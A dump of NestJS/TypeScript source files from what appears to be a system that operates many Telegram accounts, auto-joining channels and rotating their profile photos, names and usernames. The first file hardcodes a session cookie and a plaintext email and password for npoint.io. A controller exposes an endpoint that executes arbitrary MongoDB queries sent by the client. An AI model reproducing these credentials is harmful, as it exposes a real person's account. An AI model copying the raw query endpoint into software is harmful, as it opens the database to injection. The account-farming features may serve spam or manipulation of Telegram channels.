'_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\n\n    // Method to fetch CSRF token from the sign-in API\n    private async fetchCsrfToken(): Promise<string> {\n        this.logger.debug('Fetching CSRF token...');\n        try {\n            const data = JSON.stringify({\n                \"user\": {\n                    \"email\": \"dodieajt@gmail.com\",\n                    \"password\": \"Ajtdmwajt1@\"\n                }\n            });\n\n            const config = {\n                method: 'post',\n                maxBodyLength: Infinity,\n                url: this.signInUrl,\n                headers: {\n                    'Content-Type': 'application/json',\n                    'Cookie': this.cookie\n                },\n                data: data\n            };\n\n            const response = await axios.request(config)\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\n            this.cookie = response.headers['set-cookie'][0];\n            // Extract CSRF token from the response (adjust based on your API response structure)\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\n\n            if (!this.csrfToken) {\n                throw new Error('CSRF token not found in the sign-in response.');\n            }\n\n            this.logger.debug('CSRF token fetched successfully.');\n            return this.csrfToken;\n        } catch (error) {\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\n        }\n    }\n\n    // Method to ensure CSRF token is available\n    private async ensureCsrfToken(): Promise<void> {\n        if (!this.csrfToken) {\n            await this.fetchCsrfToken();\n        }\n    }\n\n    // Method to fetch a document\n    async fetchDocument(documentId: string): Promise<any> {\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to fetch document: ${error.message}`);\n        }\n    }\n\n    // Method to post a document\n    async postDocument(document: any): Promise<any> {\n        this.logger.debug('Posting a new document...');\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\n            await this.updateDocument(response.data.token, document);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to post document: ${error.message}`);\n            throw new Error(`Failed to post document: ${error.message}`);\n        }\n    }\n\n    // Method to update a document\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\n        this.logger.debug(`Updating document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\n        const body =\n        {\n            \"contents\": JSON.stringify(updatedDocument),\n            \"original_contents\": JSON.stringify(updatedDocument),\n            \"schema\": null,\n            \"original_schema\": \"\"\n        }\n\n        try {\n            const response = await axios.put(\n                `${this.baseUrl}/documents/${documentId}`,\n                body,\n                {\n                    headers: {\n                        'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                        'Cookie': this.cookie\n                    },\n                },\n            );\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\n            console.log(response.data.contents);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to update document: ${error.message}`);\n        }\n    }\n\n    async fetchAllDocuments(): Promise<any[]> {\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            return response.data;\n        } catch (error) {\n            throw new Error(`Failed to fetch all documents: ${error.message}`);\n        }\n    }\n\n    async fetchCsrfTokenFromHtml(data) {\n        try {\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\n\n            // Step 2: Check if the CSRF token was found\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\n                throw new Error('CSRF token not found in the HTML response.');\n            }\n\n            // Step 3: Extract the CSRF token\n            const csrfToken = csrfTokenMatch[1];\n\n            // Log the CSRF token (optional)\n            console.log('CSRF Token:', csrfToken);\n\n            return csrfToken;\n        } catch (error) {\n            console.error('Error fetching CSRF token:', error);\n        }\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString, IsOptional, IsDateString } from 'class-validator';\n\nexport class CreatePromoteClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'lastActive identifier',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly lastActive: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n\n  @ApiProperty({\n    description: 'Client ID this promote mobile belongs to',\n    example: 'client123',\n    required: false\n  })\n  @IsOptional()\n  @IsString()\n  readonly clientId?: string;\n\n  @ApiProperty({\n    description: 'Status of the promote client',\n    example: 'active',\n    default: 'active',\n    required: false\n  })\n  @IsOptional()\n  @IsString()\n  readonly status?: string;\n\n  @ApiProperty({\n    description: 'Status message for the promote client',\n    example: 'Account is functioning properly',\n    default: 'Account is functioning properly',\n    required: false\n  })\n  @IsOptional()\n  @IsString()\n  message?: string;\n\n  @ApiProperty({\n    description: 'Last used timestamp for the promote client',\n    example: '2023-06-22T10:30:00.000Z',\n    required: false\n  })\n  @IsOptional()\n  @IsDateString()\n  readonly lastUsed?: Date;\n}\n","// Export all DTOs\nexport * from './create-promote-client.dto';\nexport * from './search-promote-client.dto';\nexport * from './update-promote-client.dto';\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchPromoteClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the promoteClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsOptional()\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\n\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {\n    inUse?: boolean;\n    lastUsed?: Date;\n    privacyUpdatedAt?: Date;\n    profilePicsUpdatedAt?: Date;\n    nameBioUpdatedAt?: Date;\n    profilePicsDeletedAt?: Date;\n    usernameUpdatedAt?: Date;\n    lastChecked?: Date;\n    lastUpdateAttempt?: Date;\n    failedUpdateAttempts?: number;\n    lastUpdateFailure?: Date;\n}\n","export * from './promote-client.controller';\nexport * from './promote-client.module';\nexport * from './promote-client.service';\nexport * from './dto';\nexport * from './schemas';\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put, BadRequestException } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiQuery, ApiResponse } from '@nestjs/swagger';\nimport { PromoteClientService } from './promote-client.service';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\nimport { PromoteClient } from './schemas/promote-client.schema';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\n\n@ApiTags('Promote Clients')\n@Controller('promoteclients')\nexport class PromoteClientController {\n  constructor(private readonly clientService: PromoteClientService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  @ApiBody({ type: CreatePromoteClientDto })\n  @ApiResponse({ type: PromoteClient })\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiQuery({ name: 'mobile', required: false, description: 'Mobile number' })\n  @ApiQuery({ name: 'firstName', required: false, description: 'First name' })\n  @ApiQuery({ name: 'lastName', required: false, description: 'Last name' })\n  @ApiQuery({ name: 'username', required: false, description: 'Username' })\n  @ApiResponse({ type: [PromoteClient] })\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForPromoteClients')\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\n  @ApiResponse({ type: String })\n  async joinChannelsforPromoteClients(): Promise<string> {\n    return this.clientService.joinchannelForPromoteClients();\n  }\n\n  @Get('updateInfo')\n  @ApiOperation({ summary: 'Update promote Clients Info' })\n  @ApiResponse({ type: String })\n  async updateInfo(): Promise<string> {\n    this.clientService.updateInfo();\n    return 'initiated Checking';\n  }\n\n  @Get('checkPromoteClients')\n  @ApiOperation({ summary: 'Check Promote Clients' })\n  @ApiResponse({ type: String })\n  async checkpromoteClients(): Promise<string> {\n    this.clientService.checkPromoteClients();\n    return 'initiated Checking';\n  }\n\n  @Post('addNewUserstoPromoteClients')\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        goodIds: { type: 'array', items: { type: 'string' } },\n        badIds: { type: 'array', items: { type: 'string' } },\n        clientsNeedingPromoteClients: { type: 'array', items: { type: 'string' } }\n      }\n    }\n  })\n  @ApiResponse({ type: String })\n  async addNewUserstoPromoteClients(@Body() body: {\n    goodIds: string[];\n    badIds: string[];\n    clientsNeedingPromoteClients?: string[];\n  }): Promise<string> {\n    if (!body || !Array.isArray(body.goodIds) || !Array.isArray(body.badIds)) {\n      throw new BadRequestException('goodIds and badIds must be arrays');\n    }\n\n    if (body.clientsNeedingPromoteClients && !Array.isArray(body.clientsNeedingPromoteClients)) {\n      throw new BadRequestException('clientsNeedingPromoteClients must be an array');\n    }\n\n    this.clientService.addNewUserstoPromoteClients(\n      body.badIds,\n      body.goodIds,\n      body.clientsNeedingPromoteClients || [],\n      undefined\n    );\n    return 'initiated Checking';\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  @ApiQuery({ name: 'status', required: false, description: 'Filter by status (active/inactive)' })\n  @ApiResponse({ type: [PromoteClient] })\n  async findAll(@Query('status') status?: string): Promise<PromoteClient[]> {\n    return this.clientService.findAll(status);\n  }\n\n  @Get('SetAsPromoteClient/:mobile')\n  @ApiOperation({ summary: 'Set as Promote Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiResponse({ type: PromoteClient })\n  async setAsPromoteClient(@Param('mobile') mobile: string) {\n    return this.clientService.setAsPromoteClient(mobile);\n  }\n\n  @Get('mobile/:mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiResponse({ type: PromoteClient })\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch('mobile/:mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiBody({ type: UpdatePromoteClientDto })\n  @ApiResponse({ type: PromoteClient })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put('mobile/:mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiBody({ type: UpdatePromoteClientDto })\n  @ApiResponse({ type: PromoteClient })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete('mobile/:mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiResponse({ type: null })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  @ApiResponse({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    return this.clientService.executeQuery(query);\n  }\n\n  @Get('distribution')\n  @ApiOperation({ summary: 'Get promote client distribution per client' })\n  @ApiResponse({ type: Object })\n  async getPromoteClientDistribution(): Promise<any> {\n    return this.clientService.getPromoteClientDistribution();\n  }\n\n  @Get('status/:status')\n  @ApiOperation({ summary: 'Get promote clients by status' })\n  @ApiParam({ name: 'status', description: 'Status to filter by (active/inactive)', type: String })\n  @ApiResponse({ type: [PromoteClient] })\n  async getPromoteClientsByStatus(@Param('status') status: string): Promise<PromoteClient[]> {\n    return this.clientService.getPromoteClientsByStatus(status);\n  }\n\n  @Get('messages/all')\n  @ApiOperation({ summary: 'Get all promote clients with their status messages' })\n  async getPromoteClientsWithMessages(): Promise<Array<{ mobile: string, status: string, message: string, clientId?: string }>> {\n    return this.clientService.getPromoteClientsWithMessages();\n  }\n\n  @Patch('status/:mobile')\n  @ApiOperation({ summary: 'Update status of a promote client' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        status: { type: 'string', description: 'New status (active/inactive)' },\n        message: { type: 'string', description: 'Status message (optional)' }\n      },\n      required: ['status']\n    }\n  })\n  @ApiResponse({ type: PromoteClient })\n  async updateStatus(@Param('mobile') mobile: string, @Body() body: { status: string; message?: string }): Promise<PromoteClient> {\n    if (body.status !== 'active' && body.status !== 'inactive') {\n      throw new BadRequestException('Status must be either \"active\" or \"inactive\"');\n    }\n    return this.clientService.updateStatus(mobile, body.status as 'active' | 'inactive', body.message);\n  }\n\n  @Patch('activate/:mobile')\n  @ApiOperation({ summary: 'Mark a promote client as active' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        message: { type: 'string', description: 'Activation message (optional)' }\n      }\n    }\n  })\n  @ApiResponse({ type: PromoteClient })\n  async markAsActive(@Param('mobile') mobile: string, @Body() body: { message?: string } = {}): Promise<PromoteClient> {\n    return this.clientService.markAsActive(mobile, body.message);\n  }\n\n  @Patch('deactivate/:mobile')\n  @ApiOperation({ summary: 'Mark a promote client as inactive' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        reason: { type: 'string', description: 'Reason for deactivation' }\n      },\n      required: ['reason']\n    }\n  })\n  @ApiResponse({ type: PromoteClient })\n  async markAsInactive(@Param('mobile') mobile: string, @Body() body: { reason: string }): Promise<PromoteClient> {\n    return this.clientService.markAsInactive(mobile, body.reason);\n  }\n\n  @Patch('mark-used/:mobile')\n  @ApiOperation({ summary: 'Mark a promote client as used (update lastUsed timestamp)' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        message: { type: 'string', description: 'Usage message (optional)' }\n      }\n    }\n  })\n  async markAsUsed(\n    @Param('mobile') mobile: string,\n    @Body() body: { message?: string } = {}\n  ): Promise<PromoteClient> {\n    return this.clientService.markAsUsed(mobile, body.message);\n  }\n\n  @Patch('update-last-used/:mobile')\n  @ApiOperation({ summary: 'Update last used timestamp for a promote client' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  @ApiResponse({ type: PromoteClient })\n  async updateLastUsed(@Param('mobile') mobile: string): Promise<PromoteClient> {\n    return this.clientService.updateLastUsed(mobile);\n  }\n\n  @Get('least-recently-used/:clientId')\n  @ApiOperation({ summary: 'Get least recently used promote clients for a specific client' })\n  @ApiParam({ name: 'clientId', description: 'Client ID to get promote clients for', type: String })\n  @ApiQuery({ name: 'limit', required: false, description: 'Number of promote clients to return', type: Number })\n  @ApiResponse({ type: [PromoteClient] })\n  async getLeastRecentlyUsed(@Param('clientId') clientId: string, @Query('limit') limit?: number): Promise<PromoteClient[]> {\n    return this.clientService.getLeastRecentlyUsedPromoteClients(clientId, limit || 1);\n  }\n\n  @Get('next-available/:clientId')\n  @ApiOperation({ summary: 'Get next available promote client for a specific client' })\n  @ApiParam({ name: 'clientId', description: 'Client ID to get next available promote client for', type: String })\n  @ApiResponse({ type: PromoteClient })\n  async getNextAvailable(@Param('clientId') clientId: string): Promise<PromoteClient | null> {\n    return this.clientService.getNextAvailablePromoteClient(clientId);\n  }\n\n  @Get('unused')\n  @ApiOperation({ summary: \"Get promote clients that haven't been used for a specified time period\" })\n  @ApiQuery({ name: 'hoursAgo', required: false, description: 'Hours ago cutoff (default: 24)', type: Number })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String })\n  @ApiResponse({ type: [PromoteClient] })\n  async getUnusedPromoteClients(@Query('hoursAgo') hoursAgo?: number, @Query('clientId') clientId?: string): Promise<PromoteClient[]> {\n    return this.clientService.getUnusedPromoteClients(hoursAgo || 24, clientId);\n  }\n\n  @Get('usage-stats')\n  @ApiOperation({ summary: 'Get usage statistics for promote clients' })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String })\n  @ApiResponse({\n    schema: {\n      type: 'object',\n      properties: {\n        totalClients: { type: 'number' },\n        neverUsed: { type: 'number' },\n        usedInLast24Hours: { type: 'number' },\n        usedInLastWeek: { type: 'number' },\n        averageUsageGap: { type: 'number' }\n      }\n    }\n  })\n  async getUsageStatistics(@Query('clientId') clientId?: string): Promise<{\n    totalClients: number;\n    neverUsed: number;\n    usedInLast24Hours: number;\n    usedInLastWeek: number;\n    averageUsageGap: number;\n  }> {\n    return this.clientService.getUsageStatistics(clientId);\n  }\n}","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteClientService } from './promote-client.service';\nimport { PromoteClientController } from './promote-client.controller';\nimport { PromoteClient, PromoteClientSchema } from './schemas/promote-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { SessionModule } from '../session-manager';\nimport { BotsModule } from '../bots';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: PromoteClient.name, schema: PromoteClientSchema, collection: 'promoteClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => BufferClientModule),\n    forwardRef(() => SessionModule),\n    BotsModule  \n ],\n  controllers: [PromoteClientController],\n  providers: [PromoteClientService],\n  exports: [PromoteClientService]\n})\nexport class PromoteClientModule { }\n","import { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport {\n    BadRequestException,\n    ConflictException,\n    HttpException,\n    Inject,\n    Injectable,\n    InternalServerErrorException,\n    NotFoundException,\n    OnModuleDestroy,\n    forwardRef,\n} from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport {\n    PromoteClient,\n    PromoteClientDocument,\n} from './schemas/promote-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\nimport { SessionService } from '../session-manager';\nimport { getCuteEmoji, getRandomPetName, Logger, obfuscateText } from '../../utils';\nimport { ActiveChannel } from '../active-channels';\nimport { channelInfo } from '../../utils/telegram-utils/channelinfo';\nimport { getProfilePics } from '../Telegram/utils/getProfilePics';\nimport { deleteProfilePhotos } from '../Telegram/utils/deleteProfilePics';\nimport isPermanentError from '../../utils/isPermanentError';\nimport { Api } from 'telegram';\nimport { Client } from '../clients/schemas/client.schema';\nimport TelegramManager from '../Telegram/TelegramManager';\nimport { CloudinaryService } from '../../cloudinary';\nimport path from 'path';\nimport { isIncludedWithTolerance, safeAttemptReverse } from '../../utils/checkMe.utils';\nimport { BotsService, ChannelCategory } from '../bots';\nimport { ClientHelperUtils } from '../shared/client-helper.utils';\n\n@Injectable()\nexport class PromoteClientService implements OnModuleDestroy {\n    private readonly logger = new Logger(PromoteClientService.name);\n    private joinChannelMap: Map<string, (Channel | ActiveChannel)[]> = new Map();\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout | null = null;\n    private leaveChannelIntervalId: NodeJS.Timeout | null = null;\n    private isLeaveChannelProcessing: boolean = false;\n    private isJoinChannelProcessing: boolean = false;\n    private activeTimeouts: Set<NodeJS.Timeout> = new Set();\n    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes\n    private readonly LEAVE_CHANNEL_INTERVAL = 60 * 1000; // 1 minute\n    private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;\n    private readonly MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER = 10;\n    private readonly MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT = 12;\n    private readonly MAX_MAP_SIZE = 100;\n    private readonly CHANNEL_PROCESSING_DELAY = 10000; // 10 seconds\n    private readonly CLEANUP_INTERVAL = 10 * 60 * 1000; // 10 minutes\n    private cleanupIntervalId: NodeJS.Timeout | null = null;\n\n    // Date/time constants\n    private readonly ONE_DAY_MS = 24 * 60 * 60 * 1000;\n    private readonly THREE_MONTHS_MS = 3 * 30 * this.ONE_DAY_MS;\n    private readonly INACTIVE_USER_CUTOFF_DAYS = 90; // 3 months\n\n    // Dynamic availability configuration\n    private readonly MIN_TOTAL_PROMOTE_CLIENTS = 12; // Minimum total per client\n    private readonly AVAILABILITY_WINDOWS = [\n        { name: 'today', days: 0, minRequired: 3 },\n        { name: 'tomorrow', days: 1, minRequired: 5 },\n        { name: 'oneWeek', days: 7, minRequired: 7 },\n        { name: 'tenDays', days: 10, minRequired: 9 }\n    ];\n\n    constructor(\n        @InjectModel(PromoteClient.name)\n        private promoteClientModel: Model<PromoteClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => SessionService))\n        private sessionService: SessionService,\n        private botsService: BotsService\n    ) { }\n\n    private startMemoryCleanup(): void {\n        if (this.cleanupIntervalId) return; // Avoid duplicate intervals\n        this.cleanupIntervalId = setInterval(() => {\n            this.performMemoryCleanup();\n        }, this.CLEANUP_INTERVAL);\n        this.activeTimeouts.add(this.cleanupIntervalId);\n    }\n\n    private clearMemoryCleanup(): void {\n        if (this.cleanupIntervalId) {\n            clearInterval(this.cleanupIntervalId);\n            this.activeTimeouts.delete(this.cleanupIntervalId);\n            this.cleanupIntervalId = null;\n        }\n    }\n\n    private performMemoryCleanup(): void {\n        try {\n            // Clean up empty entries in joinChannelMap\n            for (const [mobile, channels] of this.joinChannelMap.entries()) {\n                if (!channels || channels.length === 0) {\n                    this.logger.debug(`Cleaning up empty joinChannelMap entry for mobile: ${mobile}`);\n                    this.joinChannelMap.delete(mobile);\n                }\n            }\n\n            // Clean up empty entries in leaveChannelMap\n            for (const [mobile, channels] of this.leaveChannelMap.entries()) {\n                if (!channels || channels.length === 0) {\n                    this.logger.debug(`Cleaning up empty leaveChannelMap entry for mobile: ${mobile}`);\n                    this.leaveChannelMap.delete(mobile);\n                }\n            }\n\n            // Trim maps if exceeding max size\n            this.trimMapIfNeeded(this.joinChannelMap, 'joinChannelMap');\n            this.trimMapIfNeeded(this.leaveChannelMap, 'leaveChannelMap');\n\n            this.logger.debug(`Memory cleanup completed. Maps sizes - Join: ${this.joinChannelMap.size}, Leave: ${this.leaveChannelMap.size}`);\n        } catch (error) {\n            this.logger.error('Error during memory cleanup:', error);\n        }\n    }\n\n    private trimMapIfNeeded<T>(map: Map<string, T>, mapName: string): void {\n        if (map.size > this.MAX_MAP_SIZE) {\n            const keysToRemove = Array.from(map.keys()).slice(this.MAX_MAP_SIZE);\n            keysToRemove.forEach(key => map.delete(key));\n            this.logger.warn(`Trimmed ${keysToRemove.length} entries from ${mapName}`);\n        }\n    }\n\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\n        const promoteClientData = {\n            ...promoteClient,\n            status: promoteClient.status || 'active',\n            message: promoteClient.message || 'Account is functioning properly',\n        };\n        const newUser = new this.promoteClientModel(promoteClientData);\n        const result = await newUser.save();\n        this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_NOTIFICATIONS, `Promote Client Created:\\n\\nMobile: ${promoteClient.mobile}`);\n        return result;\n    }\n\n    async findAll(statusFilter?: string): Promise<PromoteClient[]> {\n        const filter = statusFilter ? { status: statusFilter } : {};\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n        const updatedUser = await this.promoteClientModel\n            .findOneAndUpdate(\n                { mobile },\n                { $set: updateClientDto },\n                { new: true, returnDocument: 'after' },\n            )\n            .exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async updateStatus(mobile: string, status: 'active' | 'inactive', message?: string): Promise<PromoteClient> {\n        const updateData: UpdatePromoteClientDto = { status };\n        if (message) {\n            updateData.message = message;\n        }\n        await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_NOTIFICATIONS, `Promote Client:\\n\\nStatus Updated to ${status}\\nMobile: ${mobile}\\nReason: ${message || ''}`);\n        return this.update(mobile, updateData);\n    }\n\n    async updateLastUsed(mobile: string): Promise<PromoteClient> {\n        return this.update(mobile, { lastUsed: new Date() });\n    }\n\n    async markAsUsed(mobile: string, message?: string): Promise<PromoteClient> {\n        const updateData: UpdatePromoteClientDto = { lastUsed: new Date() };\n        if (message) {\n            updateData.message = message;\n        }\n        return this.update(mobile, updateData);\n    }\n\n    async markAsInactive(mobile: string, reason: string): Promise<PromoteClient> {\n        this.logger.log(`Marking promote client ${mobile} as inactive: ${reason}`);\n        try {\n            return await this.updateStatus(mobile, 'inactive', reason);\n        } catch (error) {\n            this.logger.error(`Failed to mark promote client ${mobile} as inactive: ${error.message}`);\n        }\n    }\n\n    async markAsActive(mobile: string, message: string = 'Account is 